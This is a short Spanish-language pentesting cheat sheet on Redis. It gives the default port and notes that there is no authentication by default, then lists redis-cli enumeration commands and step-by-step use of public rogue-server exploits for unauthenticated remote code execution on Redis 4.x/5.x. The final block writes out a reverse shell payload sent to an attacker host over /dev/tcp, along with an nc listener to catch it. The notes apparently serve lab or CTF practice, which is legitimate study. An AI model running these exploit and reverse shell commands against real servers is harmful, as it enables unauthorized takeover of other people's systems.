# Redis

Tags: #Redis 

**Redis** es una base de datos **en memoria** (in-memory data store) muy rápida.

**Características:**
- **Key-Value store** - Almacena datos como pares clave-valor
- **En memoria** - Todo corre en RAM (muy rápido)
- **NoSQL** - No usa tablas SQL tradicionales
- **Strings, Lists, Sets, Hashes, Sorted Sets** - Soporta múltiples tipos de datos
- **Puerto por defecto: 6379**
- **Sin autenticación por defecto** - Grande problema de seguridad

```bash 
❯ redis-cli -h <IP> -p <Port> 

❯ redis-cli -a <Password> -h <IP> -p <Port>    # Nos conectamos a Redis 

	❯ info                   # Conocer la versión 
	❯ select 0               # Seleccionar la base de datos
	❯ keys *                 # Listar todas las keys
	❯ type authlist          # Mirar de que tipo de keys es 'lista'
	❯ lrange authlist 0 5                
```


## Redis versión 5.0.9 (Efectiva)

* [RCE](https://github.com/jas502n/Redis-RCE)

```bash 
# Forma automática
❯ python redis-rce.py -r IP_redis -p 6379 -L IP_Kali -P 80 -f exp_lin.so
```

## Forma 2 - versión 5.0.9 

* [Rogue Server RCE](https://github.com/Mohnad-AL-saif/Redis-4.x-5.x---Unauthenticated-Code-Execution)

```bash 
# Prerequisitos 
❯ sudo apt update
❯ sudo apt install -y build-essential make gcc
```

```bash 
# Instalar dependendias 
❯ python3 -m venv env && source env/bin/activate

# Compilar el módulo
❯ cd RedisModulesSDK/
❯ make 
❯ ls -la exp.so      # Verificar que se compilo exitosamenete
❯ cp exp.so ../      # Copiar el módulo 
```

```bash 
# Ejecutar un comando 
❯ python3 redis-rogue-rce.py -r <TARGET_IP> -L <ATTACKER_IP> -c "id"
```

```bash 
# Ejecutar un RCE
❯ python3 redis-rogue-server.py -r IP_redis -p 6379 -L IP_Kali -P 80 -f exp.so -c "bash -c 'bash -i >& /dev/tcp/IP_Kali/443 0>&1'"

❯ rlwrap nc -nlvp 443   # Recibir la revershell 
```
